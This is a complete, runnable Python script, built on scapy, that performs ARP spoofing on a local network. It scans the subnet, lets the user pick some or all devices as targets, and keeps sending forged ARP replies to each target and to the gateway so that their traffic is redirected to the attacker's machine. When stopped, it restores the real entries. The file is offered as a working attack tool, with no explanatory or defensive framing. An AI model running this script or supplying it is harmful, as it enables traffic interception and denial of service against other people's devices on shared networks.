import time
import uuid
import os
import socket
from concurrent.futures import ThreadPoolExecutor
from scapy.all import ARP, Ether, send, srp

if os.geteuid() != 0:
    print("Please run the script as root (e.g., using sudo).")
    exit(1)

attack_in_progress = True
ip_gateway = None
mac_attacker = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8 * 6, 8)][::-1])


def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip


def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    result = srp(packet, timeout=2, verbose=0)[0]
    for sent, received in result:
        return received.hwsrc


def restore_connection(target_ip):
    mac_target = get_mac(target_ip)
    mac_gw = get_mac(ip_gateway)
    if mac_target and mac_gw:
        arp_target = ARP(pdst=target_ip, hwdst=mac_target, psrc=ip_gateway, hwsrc=mac_gw, op=2)
        arp_gateway = ARP(pdst=ip_gateway, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=mac_target, op=2)
        send(arp_target, count=5, verbose=0)
        send(arp_gateway, count=5, verbose=0)
        print(f"Restored connection for {target_ip}")
    else:
        print(f"Could not restore connection for {target_ip}")


def get_gateway():
    gw = os.popen("route -n get default 2>/dev/null | grep 'gateway:' | awk '{print $2}'").read().strip()
    return gw


def get_network():
    gw = get_gateway()
    if not gw:
        print("Could not get gateway")
        exit(1)
    parts = gw.split('.')
    return '.'.join(parts[:3]) + '.0/24'


def scan_network(network):
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=2, verbose=0)[0]
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    return devices


def spoof_targets_chunk(target_ips):
    targets = {}
    for ip in target_ips:
        mac = get_mac(ip)
        if mac:
            targets[ip] = mac
        else:
            print(f"Could not get MAC for {ip}")
    while attack_in_progress:
        for ip, mac in targets.items():
            arp_target = ARP(pdst=ip, hwdst=mac, psrc=ip_gateway, hwsrc=mac_attacker, op=2)
            arp_gateway = ARP(pdst=ip_gateway, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip, hwsrc=mac_attacker, op=2)
            send(arp_target, verbose=0)
            send(arp_gateway, verbose=0)
        time.sleep(2)


def main():
    global ip_gateway, attack_in_progress
    ip_gateway = get_gateway()
    network = get_network()
    all_devices = scan_network(network)
    local_ip = get_local_ip()
    devices = [d for d in all_devices if d['ip'] != local_ip]
    if not devices:
        print("No devices found (excluding the local device).")
        return
    print("Devices found:")
    for i, device in enumerate(devices, 1):
        print(f"{i}. IP: {device['ip']}, MAC: {device['mac']}")
    selected = input("Enter device numbers to attack (comma separated) or 'all' to attack all devices: ").strip()
    target_ips = []
    if selected.lower() == "all":
        target_ips = [d['ip'] for d in devices]
    else:
        try:
            indices = [int(x.strip()) for x in selected.split(',') if x.strip().isdigit()]
        except:
            print("Invalid input.")
            return
        for idx in indices:
            if 1 <= idx <= len(devices):
                target_ips.append(devices[idx - 1]['ip'])
    if not target_ips:
        print("No valid devices selected.")
        return
    workers = min(10, len(target_ips))
    chunks = [target_ips[i::workers] for i in range(workers)]
    with ThreadPoolExecutor(max_workers=workers) as executor:
        for chunk in chunks:
            executor.submit(spoof_targets_chunk, chunk)
        print("ARP spoofing in progress. Press Ctrl+C to stop and restore connections.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            attack_in_progress = False
            time.sleep(2)
            for ip in target_ips:
                restore_connection(ip)
            print("Attack stopped. Connections restored.")


if __name__ == '__main__':
    main()
